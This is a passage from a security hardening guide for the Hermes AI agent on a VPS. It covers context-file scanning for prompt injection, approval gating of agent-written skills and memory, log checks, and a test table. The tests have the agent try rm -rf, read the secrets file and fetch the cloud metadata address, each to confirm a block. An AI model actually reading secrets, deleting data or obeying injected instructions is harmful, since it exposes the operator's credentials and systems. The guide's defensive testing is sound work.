> The default is `true`, meaning commands proceed if Tirith is unavailable or times out. That is the friendly default for a laptop where a missing binary should not block your work. On a VPS running unattended, set it to `false`. Commands are then blocked until the scan succeeds. You trade a little availability for the guarantee that a scan never silently skips. Tirith ships prebuilt binaries for Linux x86_64 and aarch64 — your Hostinger VPS is covered.

**Step 6.4 — Context file scanning**

`AGENTS.md`, `SOUL.md`, and `.cursorrules` are scanned for prompt injection before being loaded into the system prompt. The scanner checks for instructions to ignore prior instructions, hidden HTML comments with suspicious keywords, attempts to read secrets, credential exfiltration via curl, and invisible Unicode characters such as zero-width spaces and bidirectional overrides.

A blocked file shows: `[BLOCKED: AGENTS.md contained potential prompt injection (prompt_injection). Content not loaded.]`

> **✅ Verify: Watch for blocked context files**
> ```bash
> grep -i 'BLOCKED' ~/.hermes/logs/*.log | tail -20
> # Any hit here deserves investigation --- something tried to
> # inject instructions through a project file.
> ```

---

## Phase 7 — Govern the Learning Loop

*Control what your agent teaches itself.*

This phase is specific to Hermes and has no equivalent in other agent frameworks. Your agent writes its own skills after complex tasks. A poisoned skill persists on disk and loads into every future session. These are the controls.

```yaml
# ~/.hermes/config.yaml
memory:
  memory_enabled: true
  user_profile_enabled: true
  memory_char_limit: 2200
  user_char_limit: 1375
  write_approval: true       # ← stage every memory write

skills:
  write_approval: true       # ← stage every skill write
  guard_agent_created: true  # ← content scanner
```

With `write_approval` on, every `skill_manage` write is staged rather than committed, surviving restarts under `~/.hermes/pending/skills/`. This applies whether the write came from a foreground turn or the background review that runs after a session.

```bash
# Reviewing staged writes
/skills pending          # list staged writes
/skills diff <id>        # full unified diff
/skills approve <id>     # apply (or 'all')
/skills reject <id>      # drop (or 'all')

/memory pending
/memory approve <id>
/memory reject <id>
```

```bash
# Protect your key skills

# Pinned skills cannot be deleted by the agent,
# but can still be patched and improved
hermes curator pin cve-triage
hermes curator pin daily-briefing

# Put the skill library under version control
cd ~/.hermes/skills && git init && git add -A
git commit -m "baseline skill library"
```

---

## Phase 8 — Monitoring and Maintenance

*The layer that keeps the other eight honest.*

**Step 8.1 — Know your logs**

```bash
ls -la ~/.hermes/logs/

# Unauthorized access attempts
grep -i 'unauthorized\|denied' ~/.hermes/logs/gateway.log | tail -30

# Blocked commands and prompt injection attempts
grep -i 'BLOCKED' ~/.hermes/logs/*.log | tail -30

# Approval requests --- unexpected ones are the interesting ones
grep -i 'approval\|dangerous' ~/.hermes/logs/*.log | tail -30
```

The official guidance is to review logs regularly for unauthorized access attempts, repeated command failures, unexpected approval requests, blocked actions, authentication issues, and unusual agent behaviour. On a VPS this is your only visibility — nobody is watching the terminal.

**Step 8.2 — File integrity monitoring**

```bash
# Watch the skills directory for agent-authored changes
sudo apt install inotify-tools -y

inotifywait -m -r -e create,modify,delete \
  ~/.hermes/skills/ \
  --format '%T %w%f %e' --timefmt '%Y-%m-%d %H:%M:%S' \
  | tee -a /var/log/hermes-skill-changes.log
```

**Step 8.3 — A weekly routine**

1. **Run `hermes doctor`.** Surfaces active supply-chain advisories with remediation steps. Acknowledge ones you have acted on with `hermes doctor --ack <advisory-id>`.
2. **Review the command allowlist.** Anything approved with "always" is saved permanently to `config.yaml`. Audit it: `hermes config edit`.
3. **Check pairing state.** `hermes pairing list` — revoke anyone who no longer needs access.
4. **Read the logs.** Ten minutes on the greps above.
5. **Update.** `hermes update`. Security improvements land in nearly every release — a six-month-old install is a worse install regardless of how carefully you configured it.

```bash
# Supply-chain advisories
hermes doctor                          # full advisory report
hermes doctor --ack <advisory-id>      # dismiss after acting

# Optional: block runtime package installs entirely
# in ~/.hermes/config.yaml:
security:
  allow_lazy_installs: false
```

---

## Phase 9 — Verify Everything

*Prove each layer actually works.*

Configuration you have not tested is configuration you are guessing about. Work through this list and confirm each behaves as expected.

| Test | Expected result |
|---|---|
| Message the bot from an unauthorized Telegram account | Pairing code or silence — never a normal response |
| Ask the agent: `hostname && ls /` | Container hostname and filesystem, not your VPS |
| Ask the agent to run `rm -rf` on a test directory | Approval prompt arrives in Telegram |
| Ask the agent to run a command matching your deny list | BLOCKED error, no prompt, nothing runs |
| Ask the agent to read `~/.hermes/.env` | Should refuse or be blocked — investigate if it succeeds |
| Ask the agent to fetch `http://169.254.169.254/` | Blocked by SSRF protection |
| Ask the agent to fetch a blocklisted domain | Error explaining the domain is blocked by policy |
| Give the agent a complex task, then run `/skills pending` | Staged skill write awaiting your approval |
| `ssh root@your-vps-ip` | Connection refused |
| Run `hermes doctor` | No unaddressed advisories |

**The final self-audit**

Finish this the same way you started: ask the agent to check its own posture, now that everything is configured.

> **💬 Post-hardening audit prompt**
> Re-run your security self-review now that I have hardened the deployment.
> Read `~/.hermes/config.yaml` and confirm each of these:
> - `terminal.backend` is `docker`
> - `terminal.docker_forward_env` is empty
> - `approvals.mode` is `manual` and `cron_mode` is `deny`
> - `approvals.deny` contains custom rules
> - `security.allow_private_urls` is `false`
> - `security.tirith_enabled` is `true` and `tirith_fail_open` is `false`
> - `memory.write_approval` and `skills.write_approval` are `true`
> - No allow-all user flags anywhere
>
> Report anything that does not match, and tell me what is still weak. Do not read or print `~/.hermes/.env` contents.

## Key Takeaways

1. Hermes has eight independent security layers. Each assumes the others might fail. No single layer is the answer.
2. Harden the VPS before Hermes: non-root user, key-only SSH on a non-default port, UFW plus the Hostinger panel firewall, Fail2Ban, unattended upgrades.
3. Authorization is your most important layer on Telegram. Explicit `TELEGRAM_ALLOWED_USERS` or DM pairing. Never `GATEWAY_ALLOW_ALL_USERS`.
4. In Docker, always run pairing approvals with `-u hermes` or they fail silently.
5. Use `approvals.mode: manual` on a VPS, and `cron_mode: deny` is non-negotiable for unattended jobs.
6. `approvals.deny` is your VPS-specific guardrail — block firewall changes, SSH stops, and key access that the hardline blocklist does not cover.
7. Container backend is the only real boundary — but it skips approval checks entirely. Empty `docker_forward_env`, ephemeral workspace.
8. Set `tirith_fail_open: false` on an unattended server. The default of `true` is for laptops.
9. Govern the learning loop with `write_approval` on both memory and skills, and pin your critical skills.
10. Update discipline matters more than the initial config. A six-month-old install is a worse install.
